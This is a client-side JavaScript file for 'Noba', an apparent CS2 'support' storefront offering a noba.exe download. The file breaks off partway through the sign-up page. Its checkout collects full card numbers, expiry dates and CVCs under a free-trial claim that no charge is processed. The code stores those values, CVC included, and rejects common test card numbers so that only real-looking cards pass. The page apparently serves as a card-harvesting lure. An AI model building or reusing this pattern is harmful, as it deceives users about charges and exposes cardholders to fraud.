const STORAGE_KEY = "noba.activation";
const PENDING_KEY = "noba.pending";
const ORDER_HISTORY_KEY = "noba.orders";
const SESSION_KEY = "noba.session";
const ACCOUNTS_KEY = "noba.accounts";
const FREE_KEY_REGISTRY_KEY = "noba.free.keys";
const CARD_USAGE_KEY = "noba.card.usage";
const OWNER_SESSION_KEY = "noba.owner.session";
const OWNER_SPECIAL_CREDENTIALS = {
  "bd0ef1bd9199dd1c1f4a3c475db90d4d9a51e398b79084c6fc536da14f670fa5": "526b7f656ae5062b8b6accf73e4750b7189e2016d206223f44409d4d660c3658",
  "072b558ec9636d2048bf818c7ad3e1fd8e3c3f9a70104fc9d1f95227bb61af32": "b9879b296269ce4019fd80a11d5760ed8440cd2c8fc124386fc1a2fca4940649",
};
const FREE_KEY_WINDOW_MS = 7 * 24 * 60 * 60 * 1000;
const LICENSE_DOWNLOAD = {
  name: "noba.exe",
  url: "./public/noba.exe",
};

const PLANS = [
  {
    id: "paid",
    name: "Pro Access",
    price: 7.99,
    period: "",
    featured: true,
    tagline: "Get practical CS2 guidance, smarter decision support, and step-by-step improvement tools.",
    features: [
      "3-day free trial",
      "Live CS2 gameplay tips",
      "Positioning and decision support",
      "Practice routines and progress tracking",
    ],
  },
];

const PAYMENT_METHODS = [
  { value: "card", label: "Card" },
  { value: "crypto", label: "Crypto" },
];

const CURRENCY_RATES = {
  EUR: 1,
  USD: 1.1875,
  GBP: 0.875,
  CAD: 1.625,
  AUD: 1.625,
};

const root = document.getElementById("app");

function loadActivation() {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    return raw ? JSON.parse(raw) : null;
  } catch {
    return null;
  }
}

function saveActivation(record) {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(record));
}

function clearActivation() {
  localStorage.removeItem(STORAGE_KEY);
}

function loadPending() {
  try {
    const raw = localStorage.getItem(PENDING_KEY);
    return raw ? JSON.parse(raw) : null;
  } catch {
    return null;
  }
}

function savePending(record) {
  localStorage.setItem(PENDING_KEY, JSON.stringify(record));
}

function clearPending() {
  localStorage.removeItem(PENDING_KEY);
}

function loadOrderHistory() {
  try {
    const raw = localStorage.getItem(ORDER_HISTORY_KEY);
    return raw ? JSON.parse(raw) : [];
  } catch {
    return [];
  }
}

function saveOrderHistory(records) {
  localStorage.setItem(ORDER_HISTORY_KEY, JSON.stringify(records));
}

function appendOrderAttempt(record) {
  if (!record || !record.id) return;
  const existing = loadOrderHistory();
  const next = [...existing, record].filter(Boolean);
  const seen = new Set();
  const deduped = next.filter((item) => {
    const key = `${item.id}|${String(item.email || "").trim().toLowerCase()}|${String(item.createdAt || "")}`;
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  });
  saveOrderHistory(deduped);
}

function loadSession() {
  try {
    const raw = localStorage.getItem(SESSION_KEY);
    return raw ? JSON.parse(raw) : null;
  } catch {
    return null;
  }
}

function saveSession(user) {
  localStorage.setItem(SESSION_KEY, JSON.stringify(user));
}

function clearSession() {
  localStorage.removeItem(SESSION_KEY);
}

function isSignedIn() {
  return !!loadSession();
}

function loadAccounts() {
  try {
    const raw = localStorage.getItem(ACCOUNTS_KEY);
    return raw ? JSON.parse(raw) : {};
  } catch {
    return {};
  }
}

function saveAccounts(accounts) {
  localStorage.setItem(ACCOUNTS_KEY, JSON.stringify(accounts));
}

function getAccountByEmail(email) {
  const accounts = loadAccounts();
  const key = String(email || "").trim().toLowerCase();
  return accounts[key] || null;
}

function getSignedUserEmail() {
  const session = loadSession();
  return session?.email || "";
}

function makeKey(planId) {
  const n = Math.abs(Date.now() % 0xffff)
    .toString(16)
    .toUpperCase()
    .padStart(4, "0");
  const prefix = planId === "paid" ? "PAID" : "FREE";
  return `NOBA-${prefix}-2026-${n}`;
}

function makeActivationCode() {
  return `PAID-${Math.random().toString(36).slice(2, 8).toUpperCase()}`;
}

function createOrderId(prefix = "order") {
  const stamp = Date.now().toString(36).toUpperCase();
  const random = Math.random().toString(36).slice(2, 8).toUpperCase();
  return `${prefix}-${stamp}-${random}`;
}

function formatCurrency(value, currency = "EUR") {
  const rate = CURRENCY_RATES[currency] ?? 1;
  const minimum = currency === "GBP" ? 0 : 8;
  const converted = Number(Math.max(minimum, value * rate).toFixed(1));
  const formatter = new Intl.NumberFormat("en-US", {
    style: "currency",
    currency,
    minimumFractionDigits: 0,
    maximumFractionDigits: 1,
  });
  return formatter.format(converted);
}

function getDeviceFingerprint() {
  const parts = [
    navigator.userAgent || "",
    navigator.language || "",
    navigator.platform || "",
    screen.width ? `${screen.width}x${screen.height}` : "",
    Intl.DateTimeFormat().resolvedOptions().timeZone || "",
  ];

  const seed = parts.join("|");
  try {
    return btoa(unescape(encodeURIComponent(seed))).slice(0, 32);
  } catch {
    return seed.split("").reduce((hash, char) => hash + char.charCodeAt(0), 0).toString(16);
  }
}

function getFreeKeyRegistry() {
  try {
    const raw = localStorage.getItem(FREE_KEY_REGISTRY_KEY);
    return raw ? JSON.parse(raw) : {};
  } catch {
    return {};
  }
}

function saveFreeKeyRegistry(registry) {
  localStorage.setItem(FREE_KEY_REGISTRY_KEY, JSON.stringify(registry));
}

function getFreeKeyState(email) {
  const key = String(email || "").trim().toLowerCase();
  const registry = getFreeKeyRegistry();
  return registry[key] || null;
}

function getCardUsageRegistry() {
  try {
    const raw = localStorage.getItem(CARD_USAGE_KEY);
    return raw ? JSON.parse(raw) : {};
  } catch {
    return {};
  }
}

function saveCardUsageRegistry(registry) {
  localStorage.setItem(CARD_USAGE_KEY, JSON.stringify(registry));
}

function normalizeCardDigits(value) {
  return String(value || "").replace(/\D/g, "");
}

function getCardFingerprint(cardNumber, expiry = "") {
  const digits = normalizeCardDigits(cardNumber);
  const expiryDigits = normalizeCardDigits(expiry).slice(-4);
  const tail = digits.slice(-8);
  return [tail, expiryDigits].filter(Boolean).join(":") || "unknown-card";
}

function getAccessBlockState(email, cardNumber = "", expiry = "") {
  const normalizedEmail = String(email || "").trim().toLowerCase();
  const account = getAccountByEmail(normalizedEmail);
  const registry = getCardUsageRegistry();
  const cardFingerprint = getCardFingerprint(cardNumber, expiry);
  const emailRecord = registry[normalizedEmail] || null;
  const cardRecord = registry[cardFingerprint] || null;
  const realUsage = Boolean(emailRecord?.usedFreeTrial || cardRecord?.usedFreeTrial);
  const pendingRequest = loadPending();
  const isPendingFreeTrial =
    pendingRequest &&
    String(pendingRequest.email || "").trim().toLowerCase() === normalizedEmail &&
    (pendingRequest.freeTrialRequested || pendingRequest.trialPendingApproval || pendingRequest.trialApproved === false);

  if (account?.freeTrialBlocked || account?.trialBlocked || account?.ownerRemoved || account?.status === "Removed") {
    return {
      blocked: true,
      trialUsed: true,
      reason: "This account was removed from free trial access by the owner and cannot receive another trial.",
    };
  }

  if (isPendingFreeTrial) {
    return {
      blocked: true,
      trialUsed: false,
      reason: "Your free trial request is pending owner approval.",
    };
  }

  if (account?.usedFreeTrial && !realUsage) {
    const accounts = loadAccounts();
    if (accounts[normalizedEmail]) {
      delete accounts[normalizedEmail].usedFreeTrial;
      saveAccounts(accounts);
    }
  }

  if (realUsage || account?.usedFreeTrial) {
    return {
      blocked: false,
      trialUsed: true,
      reason: "",
    };
  }

  return { blocked: false, trialUsed: false, reason: "" };
}

function recordTrialUsage(email, cardNumber = "", expiry = "") {
  const normalizedEmail = String(email || "").trim().toLowerCase();
  const cardFingerprint = getCardFingerprint(cardNumber, expiry);
  const registry = getCardUsageRegistry();
  const timestamp = new Date().toISOString();

  registry[normalizedEmail] = {
    ...(registry[normalizedEmail] || {}),
    email: normalizedEmail,
    usedFreeTrial: true,
    lastUsedAt: timestamp,
    cardFingerprint,
  };

  registry[cardFingerprint] = {
    ...(registry[cardFingerprint] || {}),
    email: normalizedEmail,
    usedFreeTrial: true,
    lastUsedAt: timestamp,
    cardFingerprint,
  };

  const accounts = loadAccounts();
  const account = accounts[normalizedEmail] || { email: normalizedEmail };
  account.usedFreeTrial = true;
  account.lastCardFingerprint = cardFingerprint;
  account.lastFreeTrialAt = timestamp;
  accounts[normalizedEmail] = account;

  saveAccounts(accounts);
  saveCardUsageRegistry(registry);
  return true;
}

function canGenerateFreeKey(email) {
  const normalized = String(email || "").trim().toLowerCase();
  if (!normalized) {
    return { allowed: false, reason: "Sign in to generate a free key." };
  }

  const state = getFreeKeyState(normalized);
  const currentDevice = getDeviceFingerprint();

  if (!state) {
    return { allowed: true, reason: "" };
  }

  if (state.manuallyApproved) {
    return { allowed: true, reason: "" };
  }

  if (state.deviceFingerprint && state.deviceFingerprint !== currentDevice) {
    return {
      allowed: false,
      reason: "This free key is locked to the original device. The owner can grant one extra key if needed.",
    };
  }

  return {
    allowed: false,
    reason: "Only one free key is available unless the owner grants an extra access chance.",
  };
}

function createFreeKey(email) {
  const normalized = String(email || "").trim().toLowerCase();
  const now = Date.now();
  const state = getFreeKeyState(normalized);
  const expiresAt = now + FREE_KEY_WINDOW_MS;
  const key = `FREE-${Math.random().toString(36).slice(2, 8).toUpperCase()}`;
  const shouldGrantExtra = Boolean(state?.manuallyApproved);
  const record = {
    key,
    createdAt: now,
    expiresAt,
    deviceFingerprint: shouldGrantExtra ? null : getDeviceFingerprint(),
    manuallyApproved: false,
  };

  const registry = getFreeKeyRegistry();
  registry[normalized] = record;
  saveFreeKeyRegistry(registry);
  return record;
}

function isActivationExpired(record) {
  if (!record || record.planId !== "free") return false;
  const expiresAt = record.expiresAt ? new Date(record.expiresAt).getTime() : 0;
  return expiresAt > 0 && Date.now() > expiresAt;
}

function formatCardNumber(value) {
  const digits = value.replace(/\D/g, "").slice(0, 16);
  return (digits.match(/.{1,4}/g) ?? []).join(" ");
}

function formatExpiry(value) {
  const digits = value.replace(/\D/g, "").slice(0, 4);
  if (digits.length <= 2) return digits;
  return `${digits.slice(0, 2)}/${digits.slice(2)}`;
}

function lastFour(cardNumber) {
  const digits = cardNumber.replace(/\D/g, "");
  return digits.slice(-4).padStart(4, "•");
}

function recordFakeOrder(fields) {
  const fakeRecord = {
    id: createOrderId("fake"),
    email: String(fields.email || "").trim(),
    paymentMethod: fields.paymentMethod || "card",
    paymentNetwork: fields.cryptoNetwork || "LTC",
    paymentAddress: fields.cryptoAddress || "",
    cardName: fields.cardName || "—",
    cardNumber: fields.cardNumber || "",
    cardExpiry: fields.cardExpiry || "",
    cardCvc: fields.cardCvc || "",
    last4: lastFour(fields.cardNumber || ""),
    activationCode: `FAKE-${Math.random().toString(36).slice(2, 8).toUpperCase()}`,
    currency: fields.currency || "EUR",
    createdAt: new Date().toISOString(),
    fake: true,
    status: "Fake",
    source: "Fake card",
    planName: "Fake",
    planId: "fake",
  };

  appendOrderAttempt(fakeRecord);
  savePending(fakeRecord);
  return fakeRecord;
}

function isLuhnValid(cardNumber) {
  const digits = String(cardNumber || "").replace(/\D/g, "");
  if (digits.length < 13 || digits.length > 19) return false;

  let sum = 0;
  let shouldDouble = false;

  for (let index = digits.length - 1; index >= 0; index -= 1) {
    let value = Number(digits[index]);

    if (shouldDouble) {
      value *= 2;
      if (value > 9) value -= 9;
    }

    sum += value;
    shouldDouble = !shouldDouble;
  }

  return sum % 10 === 0;
}

function isLikelyRealCard(cardNumber) {
  const digits = String(cardNumber || "").replace(/\D/g, "");
  if (!digits || digits.length < 13 || digits.length > 19) return false;
  if (/^(.)\1+$/.test(digits)) return false;

  const sequential = digits.match(/0123|1234|2345|3456|4567|5678|6789|7890|8901|9012/);
  if (sequential) return false;

  const blockedPrefixes = [
    "000000",
    "111111",
    "222222",
    "333333",
    "400000",
    "411111",
    "424242",
    "555555",
    "601100",
    "601111",
    "378282",
    "620000",
    "700000",
  ];

  if (blockedPrefixes.some((prefix) => digits.startsWith(prefix))) return false;
  if (/^(?:\d)\1{3,}$/.test(digits)) return false;
  if (!isLuhnValid(cardNumber)) return false;

  const brand = /^4/.test(digits)
    ? "visa"
    : /^(?:34|37)/.test(digits)
      ? "amex"
      : /^(?:5[1-5]|2[2-7])/.test(digits)
        ? "mastercard"
        : /^6(?:011|5)/.test(digits)
          ? "discover"
          : "unknown";

  if (brand === "amex" && digits.length !== 15) return false;
  if ((brand === "visa" || brand === "mastercard" || brand === "discover") && digits.length !== 16) return false;

  return true;
}

function isValidExpiry(expiry) {
  const value = String(expiry || "").trim();
  if (!/^\d{2}\/\d{2}$/.test(value)) return false;

  const [monthText, yearText] = value.split("/");
  const month = Number(monthText);
  const year = Number(yearText);
  if (!Number.isInteger(month) || month < 1 || month > 12) return false;

  const currentDate = new Date();
  const currentYear = currentDate.getFullYear() % 100;
  const currentMonth = currentDate.getMonth() + 1;

  if (year < currentYear) return false;
  if (year === currentYear && month < currentMonth) return false;

  return true;
}

function parseRoute() {
  const hash = window.location.hash.replace(/^#/, "") || "/";
  const url = new URL(hash, "https://noba.local");
  return { path: url.pathname, search: url.searchParams };
}

function navigate(to) {
  window.location.hash = to;
}

function escapeHtml(value) {
  return String(value)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;");
}

function headerHtml(path, activation) {
  const link = (href, label) =>
    `<a href="#${href}" class="${path === href ? "active" : ""}">${label}</a>`;

  const session = loadSession();
  const licenseLink = session ? link("/license", "Your Licences") : "";
  const accountLink = session
    ? `<a href="#/signin" onclick="localStorage.removeItem('${SESSION_KEY}'); window.location.hash = '/signin'; return false;">Sign out</a>`
    : `<a href="#/signin" class="${path === "/signin" ? "active" : ""}">Sign in</a>`;

  return `
    <header class="site-header">
      <a href="#/" class="mark" aria-label="Noba home">
        <img src="favicon.svg" alt="Noba" class="brand-mark" />
        <span>Noba</span>
      </a>
      <nav class="nav">
        ${link("/", "Get")}
        ${licenseLink}
        ${accountLink}
      </nav>
    </header>
  `;
}

function footerHtml() {
  return `
    <footer class="site-footer">
      <p>Free activates here. Paid card pay is not live — activate those by hand.</p>
      <p><a href="#/manual">Manual activation</a></p>
    </footer>
  `;
}

function homePage(activation) {
  const plan = PLANS[0];
  const price = formatCurrency(plan.price, "EUR");
  const signedEmail = getSignedUserEmail();
  const accessState = signedEmail ? getAccessBlockState(signedEmail) : { blocked: false, trialUsed: false, reason: "" };
  const trialUsed = accessState.trialUsed;
  const href = isSignedIn() ? "#/get?plan=paid" : "#/signin";
  const trialButtonLabel = trialUsed ? "Buy now" : "Start 3-day free trial";

  return `
    <div class="page">
      ${headerHtml("/", activation)}
      <main class="stack landing-stack">
        <section class="hero-panel">
          <div class="hero-copy">
            <span class="eyebrow">CS2 support platform</span>
            <h1>Improve your CS2 gameplay with Noba.</h1>
            <p class="lede">
              Access practical CS2 guidance, smarter decision-making tools, and structured training support designed to help players improve with confidence.
            </p>
            <div class="hero-actions">
              <a class="btn btn-solid" href="${href}">${trialButtonLabel}</a>
            </div>
            ${
              activation
                ? `<div class="hero-actions"><a class="btn btn-ghost" href="#/license">You already have ${escapeHtml(activation.planName)}</a></div>`
                : ""
            }
          </div>
          <div class="hero-metric">
            <div class="stat-box">
              <strong>Smarter</strong>
              <span>decision support</span>
            </div>
            <div class="stat-box">
              <strong>Practical</strong>
              <span>CS2 advice</span>
            </div>
            <div class="stat-box">
              <strong>Sharper</strong>
              <span>gameplay habits</span>
            </div>
          </div>
        </section>

        <section class="feature-strip">
          <div>
            <span class="feature-label">Smart play</span>
            <strong>Helpful tools for better positioning, timing, and decision-making.</strong>
          </div>
          <div>
            <span class="feature-label">Advanced edge</span>
            <strong>Built to help you use more advanced techniques in real matches.</strong>
          </div>
          <div>
            <span class="feature-label">Next level</span>
            <strong>Upgrade your gaming skills to the next level!</strong>
          </div>
        </section>

        <article class="plan-card is-featured">
          <h2>${plan.name}</h2>
          <p class="plan-tagline">${plan.tagline}</p>
          <p class="price">${price}<small style="margin-left: 0.5rem; font-size: 0.95rem;"> one-time access</small></p>
          <ul>${plan.features.map((item) => `<li>${item}</li>`).join("")}</ul>
          <a class="btn btn-ghost" href="${href}">${isSignedIn() ? (trialUsed ? "Buy now" : "Start free trial") : "Sign in to unlock"}</a>
        </article>
      </main>
      ${footerHtml()}
    </div>
  `;
}

function getPage(activation, search, error = "", busy = false, fields = {}) {
  const planId = search.get("plan") === "paid" ? "paid" : "paid";
  const plan = PLANS.find((item) => item.id === planId) || PLANS[0];
  const email = fields.email ?? activation?.email ?? getSignedUserEmail();
  const signedInState = email ? getAccessBlockState(email) : { blocked: false, trialUsed: false, reason: "" };
  const selectedCurrency = fields.currency || "EUR";
  const selectedPaymentMethod = fields.paymentMethod || "card";
  const priceLabel = formatCurrency(plan.price, selectedCurrency);
  const purchaseBlocked = Boolean(email && signedInState.blocked);
  const freeTrialUsed = Boolean(email && signedInState.trialUsed && !signedInState.blocked);
  const visibleError = purchaseBlocked ? signedInState.reason : error;

  const paymentMethodSelector = `
    <label>
      Payment method
      <div class="select-wrap">
        <select name="paymentMethod">
          ${PAYMENT_METHODS.map(
            (method) =>
              `<option value="${method.value}" ${selectedPaymentMethod === method.value ? "selected" : ""}>${method.label}</option>`
          ).join("")}
        </select>
        <span class="select-arrow">▾</span>
      </div>
    </label>
  `;

  const cardFields = `
    <div class="card-box" data-payment-area="card" ${selectedPaymentMethod === "card" ? "" : "hidden"}>
      <h2>Card details</h2>
      <p class="form-hint">Start a 3-day free trial to test the CS2 support tools. No charge is processed during the trial period.</p>
      <label>
        Currency
        <div class="select-wrap">
          <select name="currency">
            ${Object.keys(CURRENCY_RATES)
              .map(
                (currency) =>
                  `<option value="${currency}" ${selectedCurrency === currency ? "selected" : ""}>${currency}</option>`
              )
              .join("")}
          </select>
          <span class="select-arrow">▾</span>
        </div>
      </label>
      <label>
        Name on card
        <input name="cardName" autocomplete="cc-name" value="${escapeHtml(fields.cardName ?? "")}" placeholder="Name" required />
      </label>
      <label>
        Card number
        <input class="card-field" name="cardNumber" inputmode="numeric" autocomplete="cc-number" value="${escapeHtml(fields.cardNumber ?? "")}" placeholder="ACCT-000003" required />
      </label>
      <div class="card-row">
        <label>
          Expiry
          <input class="card-field" name="cardExpiry" inputmode="numeric" autocomplete="cc-exp" value="${escapeHtml(fields.cardExpiry ?? "")}" placeholder="MM/YY" required />
        </label>
        <label>
          CVC
          <input class="card-field" name="cardCvc" inputmode="numeric" autocomplete="cc-csc" value="${escapeHtml(fields.cardCvc ?? "")}" placeholder="123" required />
        </label>
      </div>
    </div>
  `;

  const cryptoAddressValue = "LZSRvx42vw79Xri7JEFY5CUB2Hk7pBXEfa";
  const cryptoAmount = "0.17 LTC";

  const cryptoFields = `
    <div class="card-box" data-payment-area="crypto" ${selectedPaymentMethod === "crypto" ? "" : "hidden"}>
      <h2>Crypto payment</h2>
      <p class="form-hint">Send <strong>${cryptoAmount}</strong> to this Litecoin wallet address to unlock your access. We will confirm the payment and activate your account once received.</p>
      <label>
        Crypto network
        <div class="select-wrap">
          <select name="cryptoNetwork">
            <option value="LTC" ${(fields.cryptoNetwork || "LTC") === "LTC" ? "selected" : ""}>LTC</option>
          </select>
          <span class="select-arrow">▾</span>
        </div>
      </label>
      <label>
        Wallet address
        <input type="text" name="cryptoAddress" value="${escapeHtml(cryptoAddressValue)}" readonly aria-readonly="true" />
      </label>
    </div>
  `;

  return `
    <div class="page">
      ${headerHtml("/", activation)}
      <main class="stack">
        <h1>Buy Noba</h1>
        <p class="lede">
          Complete your access request to unlock Noba support tools. The price is <span data-price-inline>${priceLabel}</span> and the crypto payment option is available below.
        </p>
        <p class="form-hint">Use the Litecoin wallet shown below to complete your purchase and activate your access.</p>
        <form class="ticket" id="get-form">
          <input type="hidden" name="plan" value="${plan.id}" />
          <label>
            Email
            <input type="email" name="email" autocomplete="email" value="${escapeHtml(email)}" placeholder="you@email.com" required />
          </label>
          ${paymentMethodSelector}
          ${cardFields}
          ${cryptoFields}
          ${visibleError ? `<p class="form-error" role="alert">${escapeHtml(visibleError)}</p>` : ""}
          <button class="btn btn-solid" id="trial-button" type="submit" ${busy || purchaseBlocked ? "disabled" : ""}>
            ${busy ? "Working…" : freeTrialUsed ? `Buy now · ${priceLabel}` : `Start trial · ${priceLabel}`}
          </button>
          <p class="form-hint"><a href="#/">Back to plans</a></p>
        </form>
      </main>
      ${footerHtml()}
    </div>
  `;
}

function formatWhen(iso) {
  return new Intl.DateTimeFormat("en", {
    dateStyle: "medium",
    timeStyle: "short",
  }).format(new Date(iso));
}

function formatTrialEnd(iso) {
  if (!iso) return "Trial end date unavailable";

  const end = new Date(iso);
  const remainingMs = end.getTime() - Date.now();
  const remainingDays = Math.max(0, Math.ceil(remainingMs / (1000 * 60 * 60 * 24)));
  const text = formatWhen(iso);

  if (remainingDays <= 0) {
    return `Trial ended on ${text}`;
  }

  return `${text} (${remainingDays} day${remainingDays === 1 ? "" : "s"} left)`;
}

function isCancelledActivation(record) {
  return Boolean(record && record.cancelled);
}

function licensePage(activation, pending) {
  const visiblePending = pending && !pending.fake ? pending : null;

  if (!activation && !visiblePending) {
    return `
      <div class="page">
        ${headerHtml("/license", activation)}
        <main class="stack">
          <h1>No subscription yet.</h1>
          <p class="lede">Get Free now, or request Paid with a card. Paid waits until you activate it by hand.</p>
          <div class="hero-actions">
            <a class="btn btn-solid" href="#/">Choose a plan</a>
          </div>
        </main>
        ${footerHtml()}
      </div>
    `;
  }

  const isTrialApprovalPending = Boolean(visiblePending && (visiblePending.trialPendingApproval || visiblePending.freeTrialRequested));
  const isFreeExpired = activation && isActivationExpired(activation);
  const pendingBlock = visiblePending
    ? `
      <article class="license-pass">
        <div class="pass-top">
          <p>Paid request</p>
          <p class="pass-status">Waiting</p>
        </div>
        <dl>
          <div><dt>Email</dt><dd>${escapeHtml(visiblePending.email)}</dd></div>
          <div><dt>Card</dt><dd class="mono">•••• ${escapeHtml(visiblePending.last4)}</dd></div>
          <div><dt>Activation code</dt><dd class="mono">${escapeHtml(visiblePending.activationCode || "Not available")}</dd></div>
          <div><dt>Requested</dt><dd>${escapeHtml(formatWhen(visiblePending.createdAt))}</dd></div>
          <div><dt>Charge</dt><dd>Not processed</dd></div>
        </dl>
        <div class="pass-actions">
          <a class="btn btn-solid" href="#/manual">Activate manually</a>
        </div>
      </article>
    `
    : "";

  if (!activation) {
    if (isTrialApprovalPending) {
      return `
        <div class="page">
          ${headerHtml("/license", activation)}
          <main class="stack">
            <h1>Free trial pending approval.</h1>
            <p class="lede">Your free-trial request is waiting for the owner to approve it before access is activated.</p>
            ${pendingBlock}
          </main>
          ${footerHtml()}
        </div>
      `;
    }

    return `
      <div class="page">
        ${headerHtml("/license", activation)}
        <main class="stack">
          <h1>Paid access is waiting.</h1>
          <p class="lede">Your purchase request has been saved for review. You can complete activation manually if needed.</p>
          ${pendingBlock}
        </main>
        ${footerHtml()}
      </div>
    `;
  }

  const priceLabel = activation.planId === "paid"
    ? formatCurrency(7.99, activation.currency || "EUR")
    : "€0";
  const how = activation.manual ? "Manual" : "Self-serve";
  const cancelled = isCancelledActivation(activation);
  const statusText = isFreeExpired ? "Expired" : cancelled ? "Cancelled" : "Active";
  const trialEndText = activation.expiresAt ? `Access ends ${escapeHtml(formatWhen(activation.expiresAt))}` : "";
  const billingReminder = activation.expiresAt ? "You will be billed when the free trial ends." : "You will be billed when your plan renews.";
  const cancelMessage = activation.expiresAt
    ? cancelled
      ? `Cancelled. Your access will end on ${escapeHtml(formatWhen(activation.expiresAt))}. ${billingReminder}`
      : `You can cancel at any time. Your access will end on ${escapeHtml(formatWhen(activation.expiresAt))}. ${billingReminder}`
    : `You can cancel at any time. ${billingReminder}`;

  return `
    <div class="page">
      ${headerHtml("/license", activation)}
      <main class="stack">
        <h1>${escapeHtml(activation.planName)} ${isFreeExpired ? "expired" : cancelled ? "cancelled" : "is active"}.</h1>
        <p class="lede">${escapeHtml(cancelMessage)}</p>
        <article class="license-pass">
          <div class="pass-top">
            <p>Noba</p>
            <p class="pass-status">${statusText}</p>
          </div>
          <dl>
            <div><dt>Plan</dt><dd>${escapeHtml(activation.planName)}</dd></div>
            <div><dt>Price</dt><dd>${priceLabel}</dd></div>
            <div><dt>Email</dt><dd>${escapeHtml(activation.email)}</dd></div>
            <div><dt>Started</dt><dd>${escapeHtml(formatWhen(activation.activatedAt))}</dd></div>
            <div><dt>How</dt><dd>${how}</dd></div>
            <div><dt>Key</dt><dd class="mono">${escapeHtml(activation.key)}</dd></div>
            ${activation.expiresAt ? `<div><dt>${cancelled ? "Ends" : "Trial ends"}</dt><dd>${trialEndText}</dd></div>` : ""}
          </dl>
          <div class="pass-actions">
            ${isFreeExpired ? "" : `<a class="btn btn-ghost" href="${LICENSE_DOWNLOAD.url}" download="${LICENSE_DOWNLOAD.name}">Download your file</a>`}
            <a class="btn btn-ghost" href="#/">Change plan</a>
            <button class="btn" type="button" id="release-seat">Cancel</button>
          </div>
        </article>
        ${visiblePending && activation.planId !== "paid" ? pendingBlock : ""}
      </main>
      ${footerHtml()}
    </div>
  `;
}

function canActivatePaidManually(email, code, pending) {
  if (!pending || typeof email !== "string" || typeof code !== "string") return false;

  return (
    email.trim().toLowerCase() === pending.email.trim().toLowerCase() &&
    code.trim().toUpperCase() === String(pending.activationCode || "").trim().toUpperCase()
  );
}

function manualPage(activation, pending, error = "", busy = false) {
  const visiblePending = pending && !pending.fake ? pending : null;
  const email = visiblePending?.email ?? activation?.email ?? "";
  return `
    <div class="page">
      ${headerHtml("/manual", activation)}
      <main class="stack">
        <h1>Manual activation</h1>
        <p class="lede">
          Complete a valid paid request for this browser. Manual activation requires the matching email and activation code from that request.
        </p>
        <form class="ticket" id="manual-form">
          <label>
            Email tied to the paid request
            <input type="email" name="email" autocomplete="email" value="${escapeHtml(email)}" placeholder="you@email.com" required />
          </label>
          <label>
            Activation code
            <input type="text" name="activationCode" inputmode="text" placeholder="PAID-XXXXXX" required />
          </label>
          ${error ? `<p class="form-error" role="alert">${escapeHtml(error)}</p>` : ""}
          <button class="btn btn-solid" type="submit" ${busy ? "disabled" : ""}>
            ${busy ? "Activating…" : "Activate Paid"}
          </button>
          <p class="form-hint"><a href="#/license">Back to status</a></p>
        </form>
      </main>
      ${footerHtml()}
    </div>
  `;
}

function readGetFields(form) {
  return {
    email: form.elements.email?.value.trim() ?? "",
    paymentMethod: form.elements.paymentMethod?.value || "card",
    currency: form.elements.currency?.value || "EUR",
    cardName: form.elements.cardName?.value.trim() ?? "",
    cardNumber: form.elements.cardNumber?.value ?? "",
    cardExpiry: form.elements.cardExpiry?.value ?? "",
    cardCvc: form.elements.cardCvc?.value ?? "",
    cryptoNetwork: form.elements.cryptoNetwork?.value || "LTC",
    cryptoAddress: form.elements.cryptoAddress?.value.trim() ?? "",
  };
}

function bindCardInputs(form) {
  const number = form.elements.cardNumber;
  const expiry = form.elements.cardExpiry;
  const cvc = form.elements.cardCvc;
  const currency = form.elements.currency;
  const paymentMethod = form.elements.paymentMethod;
  const trialButton = form.querySelector("#trial-button");
  const priceInline = form.querySelector("[data-price-inline]");
  const cardArea = form.querySelector('[data-payment-area="card"]');
  const cryptoArea = form.querySelector('[data-payment-area="crypto"]');

  const syncPaymentAreas = () => {
    const method = paymentMethod?.value || "card";

    const applyAreaState = (area, shouldShow, requiredNames) => {
      if (!area) return;
      area.hidden = !shouldShow;
      area.style.display = shouldShow ? "block" : "none";
      area.setAttribute("aria-hidden", String(!shouldShow));

      const fields = area.querySelectorAll("input, select");
      fields.forEach((field) => {
        const isRequired = requiredNames.includes(field.name);
        field.disabled = !shouldShow;
        if (shouldShow && isRequired) {
          field.setAttribute("required", "required");
        } else {
          field.removeAttribute("required");
        }
      });
    };

    applyAreaState(cardArea, method === "card", ["cardName", "cardNumber", "cardExpiry", "cardCvc"]);
    applyAreaState(cryptoArea, method === "crypto", ["cryptoNetwork", "cryptoAddress"]);
  };

  if (currency) {
    const updateCurrencyPreview = () => {
      const chosenCurrency = currency.value || "EUR";
      const formatted = formatCurrency(7.99, chosenCurrency);
      if (priceInline) priceInline.textContent = formatted;
      if (trialButton) trialButton.textContent = `Start trial · ${formatted}`;
    };

    currency.addEventListener("change", updateCurrencyPreview);
    updateCurrencyPreview();
  }

  if (paymentMethod) {
    paymentMethod.addEventListener("change", syncPaymentAreas);
    syncPaymentAreas();
  }

  if (number) {
    number.addEventListener("input", () => {
      number.value = formatCardNumber(number.value);
    });
  }
  if (expiry) {
    expiry.addEventListener("input", () => {
      expiry.value = formatExpiry(expiry.value);
    });
  }
  if (cvc) {
    cvc.addEventListener("input", () => {
      cvc.value = cvc.value.replace(/\D/g, "").slice(0, 4);
    });
  }
}

function bannedPage() {
  return `
    <div class="page">
      ${headerHtml("/signin", null)}
      <main class="stack">
        <h1>YOU HAVE BEEN BANNED</h1>
        <p class="lede">Your account has been banned by the owner and access has been restricted.</p>
        <div class="hero-actions">
          <a class="btn btn-solid" href="#/signin">Back to sign in</a>
        </div>
      </main>
      ${footerHtml()}
    </div>
  `;
}

function signInPage(error = "") {
  return `
    <div class="page">
      ${headerHtml("/signin", null)}
      <main class="stack">
        <h1>Sign in to unlock products</h1>
        <p class="lede">Use your account email and password to access your products.</p>
        <form class="ticket" id="signin-form">
          <label>
            Email
            <input type="email" name="email" autocomplete="email" placeholder="you@email.com" required />
          </label>
          <label>
            Password
            <input type="password" name="password" autocomplete="current-password" placeholder="Your password" required />
          </label>
          ${error ? `<p class="form-error" role="alert">${escapeHtml(error)}</p>` : ""}
          <button class="btn btn-solid" type="submit">Sign in</button>
          <a class="btn btn-ghost" href="#/signup">Sign up</a>
        </form>
      </main>
      ${footerHtml()}
    </div>
  `;
}


function signUpPage(error = "") {
  return `
    <div class="page">
      ${headerHtml("/signup", null)}
      <main class="stack">
        <h1>Create your Noba account</h1>
        <p class="lede">Sign up to get access to your plans, licences, and product downloads.</p>
        <form class="ticket" id="signup-form">
          <label>
            Email
